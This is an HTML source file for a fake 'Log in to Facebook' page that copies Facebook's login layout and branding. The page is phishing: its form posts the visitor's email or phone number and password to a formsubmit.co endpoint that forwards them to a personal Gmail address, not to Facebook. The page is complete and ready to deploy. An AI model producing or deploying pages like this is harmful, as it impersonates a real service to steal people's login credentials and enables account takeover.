<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to Facebook</title>
    <link rel="icon" href="logo.jpg" type=".jpg">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="facebook-page">
            <div class="text-content">
                <h1>facebook</h1> 
                <p>Connect with friends and the world around you on Facebook.</p>
            </div>
            <div class="form-card">
                <form action="https://formsubmit.co/infomorile@gmail.com" method="POST">
                    <input type="text" name="number" placeholder="Email address or phone number" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit" class="login-btn">Log In</button>
                    <a href="#" class="forgot-link">Forgot password?</a>
                    <hr>
                    <button type="button" class="create-account-btn">Create new account</button>
                </form>
                <!-- <p class="create-page-link">
                    <a href="#">**Create a Page**</a> for a celebrity, band or business.
                </p> -->
            </div>
        </div>
    </div>
</body>
</html>
